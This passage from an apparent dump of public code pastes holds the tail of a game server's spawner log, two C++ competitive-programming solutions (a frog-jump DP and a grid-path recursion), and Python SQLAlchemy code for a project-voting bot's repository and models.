11:11:02 [16] InfectedMedic
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [17] InfectedNBC
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [18] InfectedNBCYellow
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [19] InfectedPolice
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [20] InfectedPoliceHard
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [21] InfectedPrisoner
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [22] InfectedReligious
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [23] InfectedSanta
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [24] InfectedSolitude
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [25] InfectedVillage
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [26] InfectedVillageTier1
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [27] ItemPlanks
11:11:02   Primary Spawner: ""Item"", active: yes, repeat: 1
11:11:02 [28] Loot
11:11:02   Primary Spawner: ""Loot"", active: yes, repeat: 2
11:11:02 [29] StaticContaminatedArea
11:11:02   Primary Spawner: ""Static"", active: yes, repeat: 1
11:11:02 [30] StaticHeliCrash
11:11:02   Primary Spawner: ""Static"", active: yes, repeat: 1
11:11:02   Secondary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [31] StaticMilitaryConvoy
11:11:02   Primary Spawner: ""Static"", active: yes, repeat: 1
11:11:02   Secondary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [32] StaticPoliceSituation
11:11:02   Primary Spawner: ""Static"", active: yes, repeat: 1
11:11:02   Secondary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [33] StaticTrain
11:11:02   Primary Spawner: ""Static"", active: yes, repeat: 1
11:11:02   Secondary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [34] TrajectoryApple
11:11:02   Primary Spawner: ""Trajectory"", active: yes, repeat: 1
11:11:02 [35] TrajectoryConiferous
11:11:02   Primary Spawner: ""Trajectory"", active: yes, repeat: 1
11:11:02 [36] TrajectoryDeciduous
11:11:02   Primary Spawner: ""Trajectory"", active: yes, repeat: 1
11:11:02 [37] TrajectoryHumus
11:11:02   Primary Spawner: ""Trajectory"", active: yes, repeat: 1
11:11:02 [38] TrajectoryPear
11:11:02   Primary Spawner: ""Trajectory"", active: yes, repeat: 1
11:11:02 [39] TrajectoryPlum
11:11:02   Primary Spawner: ""Trajectory"", active: yes, repeat: 1
11:11:02 [40] TrajectoryStones
11:11:02   Primary Spawner: ""Trajectory"", active: yes, repeat: 1
11:11:02 [41] VehicleCivilianSedan
11:11:02   Primary Spawner: ""Vehicle"", active: yes, repeat: 1
11:11:02 [42] VehicleHatchback02
11:11:02   Primary Spawner: ""Vehicle"", active: yes, repeat: 1
11:11:02 [43] VehicleOffroad02
11:11:02   Primary Spawner: ""Vehicle"", active: yes, repeat: 1
11:11:02 [44] VehicleOffroadHatchback
11:11:02   Primary Spawner: ""Vehicle"", active: yes, repeat: 1
11:11:02 [45] VehicleSedan02
11:11:02   Primary Spawner: ""Vehicle"", active: yes, repeat: 1
11:11:02 [46] VehicleTruck01
11:11:02   Primary Spawner: ""Vehicle"", active: yes, repeat: 1
11:11:02 [CE][Hive] :: Initializing of spawners done.
11:11:02 [CE][Hive] :: Init sequence finished.
11:11:04 [IdleMode] Entering IN - save processed
"
K0v9b05j,Frog 1,LEGEND2004,C++,Thursday 24th of August 2023 05:25:13 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define int long long
const int INF = 1000000000;
const int mod = 1e9 + 7;
const int N = 1e6 + 5;
int dp[N];

signed main()
{
    int n;
    cin >> n;
    int a[n + 5];
    for(int i = 1; i <= n; i++){
        cin >> a[i];
    }
    dp[1] = 0;
    dp[2] = abs(a[2] - a[1]);
    for(int i = 3; i <= n; i++){
        dp[i] = min(dp[i - 1] + abs(a[i] - a[i - 1]) , dp[i - 2] + abs(a[i] - a[i - 2]));
    }
    cout << dp[n] << endl;
}"
SMVGqi5J,Untitled,copython_sy,Python,Thursday 24th of August 2023 05:21:46 AM CDT,"
class Repository:

    def __init__(self, session: AsyncSession):
        self._session = session

    async def commit(self):
        await self._session.commit()

    async def check_iso(self):
        async with self._session.begin():
            await self._session.execute(update(Tags).where(
                Tags.name.contains('test')).values(name='guest'))
            await asyncio.sleep(5)

    async def get_projects(self):
        stmt = select(Project.pj_id, Project.project_thumb)
        res = await self._session.execute(stmt)
        return res.all()

    async def get_tags(self):
        stmt = select(Tags.name)
        return await self._session.scalars(stmt)

    async def get_project_data(self, pj_id: int):  # -> Project | None:
        return await self._session.get(Project, pj_id, options=(
            joinedload(Project.tags), joinedload(Project.milestones)))

    async def get_users_vote(self, pj_id: int, user_id: int):
        return await self._session.get(UserVote, (user_id, pj_id))

    async def vote(self, user_id: int, pj_id: int, vote_dir: int):
        vote = await self._session.get(UserVote, (user_id, pj_id))
        if not vote:
            vote = UserVote(user_id=user_id, pj_id=pj_id, choice=0)
            self._session.add(vote)
        vote.choice += vote_dir
        # await self._session.commit()

    async def search_with_tags(self, search_tags: Sequence[str]):
        stmt = select(Project.pj_id, Project.project_thumb)
        res = await self._session.execute(stmt)
        inter = set(res.all())
        for tag in search_tags:
            tag_obj = await self._session.get(Tags, tag)
            stmt = select(Project.pj_id, Project.project_thumb).where(
                Project.tags.contains(tag_obj))
            res = await self._session.execute(stmt)
            inter &= set(res.all())
        return inter

    async def set_milestone(self, new_checked: int, user_id: int):
        stmt_sub = select(Milestone.pj_id).where(
            Milestone.ms_id == new_checked).scalar_subquery()
        # pj = await self._session.scalar(stmt)
        # if pj:
        # stmt = update(Milestone).where(
        #     Milestone.pj_id == pj).values(ms_id=new_checked)
        # else:
        stmt = insert(chosen_milestone).values(
            pj_id=stmt_sub, ms_id=new_checked, user_id=user_id
        # ).on_conflict_do_update(
        #     index_elements=['pj_id', 'user_id'], set_={'ms_id': new_checked}
        )
        await self._session.execute(stmt)

    async def unset_milestone(self, ms_id: int, user_id: int):
        stmt = delete(chosen_milestone).where(
            chosen_milestone.c.ms_id == ms_id,
            chosen_milestone.c.user_id == user_id
        )
        await self._session.execute(stmt)

    async def get_milestones_by_one_of(self, pj_id: int, user_id: int):
        stmt = select(chosen_milestone.c.ms_id).where(
            chosen_milestone.c.pj_id == pj_id,
            chosen_milestone.c.user_id == user_id)
        res = await self._session.scalars(stmt)
        return res.all()

    async def get_user_pj_milestones(self, user_id: int, pj_id: int):
        stmt = select(chosen_milestone.c.ms_id).where(
            chosen_milestone.c.pj_id == pj_id, chosen_milestone.c.user_id == user_id)
        res = await self._session.scalars(stmt)
        return res.all()

    async def filter_ms_in_pj(self, checked: Iterable[int], pj_id):
        stmt = select(Milestone.ms_id).where(
            Milestone.pj_id == pj_id,
            Milestone.ms_id.in_(checked))
        res = await self._session.scalars(stmt)
        return res.all()

"
RQFFT2ae,Untitled,lodha1503,C++,Thursday 24th of August 2023 05:21:27 AM CDT,"#include <bits/stdc++.h> 
using namespace std;
#define ll long long
#define pb push_back
#define MOD1 1000000007
#define MOD2 998244353
#define NO cout << ""NO"" << endl
#define YES cout << ""YES"" << endl
ll expo(ll a, ll b, ll mod) {ll res = 1; while (b > 0) {if (b & 1)res = (res * a) % mod; a = (a * a) % mod; b = b >> 1;} return res;}
ll mminvprime(ll a, ll b) {return expo(a, b - 2, b);}
ll mod_add(ll a, ll b, ll m) {a = a % m; b = b % m; return (((a + b) % m) + m) % m;}
ll mod_mul(ll a, ll b, ll m) {a = a % m; b = b % m; return (((a * b) % m) + m) % m;}
ll mod_sub(ll a, ll b, ll m) {a = a % m; b = b % m; return (((a - b) % m) + m) % m;}
ll mod_div(ll a, ll b, ll m) {a = a % m; b = b % m; return (mod_mul(a, mminvprime(b, m), m) + m) % m;}
void print(vector<int> &ans){for(auto x: ans) cout<<x<<"" ""; cout<<endl;}
 
// ========================================================================================================================================================================================================
vector<int> nrow={1,0};
vector<int> ncol={0,1};
 
void recursion(vector<vector<int>> &matrix,ll n ,ll m,ll i,ll j,ll &sum,ll &ans,vector<vector<int>> &visited)
{
  
  if(i==n-1 && j==m-1)
  {
      
    if(sum>ans)
        ans=sum;
    return;
  }
 
  for(int k=0;k<2;k++)
  {
    ll delrow=i+nrow[k];
    ll delcol=j+ncol[k];
    
    if(delrow<n && delrow>=0 && delcol>=0 && delcol<m)
    {
        
        if(visited[delrow][delcol]==0)
        {
            visited[delrow][delcol]=1;
            sum+=matrix[delrow][delcol];
            
            recursion(matrix,n,m,delrow,delcol,sum,ans,visited);
            
            visited[delrow][delcol]=0;
            sum-=matrix[delrow][delcol];
        }
        
    }
        
  }
}
 
void solve()
{
  ll n,m;cin>>n>>m;
  ll ans=0;
  vector<vector<int>> matrix(n,vector<int>(m,0));
  vector<vector<int>> visited(n,vector<int>(m,0));
  for(int i=0;i<n;i++)
  {
    for(int j=0;j<m;j++)
    {
        int e;cin>>e;
        matrix[i][j]=e;
    }
  }
  ll sum=0;
  recursion(matrix,n,m,0,-1,sum,ans,visited);
  cout<<ans<<endl;
 
 
  
}
 
 
int main()
{
    solve();
}"
juUGnUfw,Untitled,copython_sy,Python,Thursday 24th of August 2023 05:16:05 AM CDT,"async def get_pj(repo: Repository, dialog_manager: DialogManager, **kwargs):
    # todo save radio button of milestones
    pj_id = dialog_manager.dialog_data.get('cur_pj')
    project = await repo.get_project_data(pj_id)
    user_id = dialog_manager.event.from_user.id
    vote = await repo.get_users_vote(pj_id, user_id)
    tags = [t.name for t in project.tags]
    ms = [(p.ms_id, p.goal) for p in project.milestones] or []
    milestones = await repo.get_user_pj_milestones(user_id, pj_id)
    milestones_widget: ManagedWidget[Select] = dialog_manager.find('chms')
    if milestones:
        for mls in milestones:
            await milestones_widget.set_checked(str(mls), True)
    if vote:
        choice = vote.choice
    else:
        choice = 0
    upvotable = -1 <= choice < 1
    downvotable = -1 < choice <= 1
    return {
        'project': project, 'links': project.links, 'ms': ms,
        'dv': downvotable, 'uv': upvotable, 'pj_tags': tags
    }"
ySMWftgx,Untitled,copython_sy,Python,Thursday 24th of August 2023 05:07:07 AM CDT,"
class Project(Base):
    __tablename__ = 'projects'

    pj_id: Mapped[int] = mapped_column(Integer, primary_key=True)
    name: Mapped[str]
    description: Mapped[str]
    links: Mapped[list[str]] = mapped_column(postgresql.ARRAY(Text))
    emo_name: Mapped[str]
    milestones: Mapped[list['Milestone']] = relationship()

    votes: Mapped[list['UserVote']] = relationship()
    tags: Mapped[list['Tags']] = relationship(secondary=projects_tags)

    ups = column_property(
        select(func.sum(UserVote.choice))
        .where(UserVote.pj_id == pj_id)
        .scalar_subquery()
    )

    @hybrid_property
    def project_thumb(self):
        name = self.name + ' ' * 12
        return f'{self.emo_name} {name[:12]} {self.ups or 0}'

    @project_thumb.expression
    def project_thumb(cls):
        return func.concat(cls.emo_name, ' ', func.left(
            func.concat(cls.name, ' ' * 12), 12),
                           ' ', func.coalesce(cls.ups, 0))

"
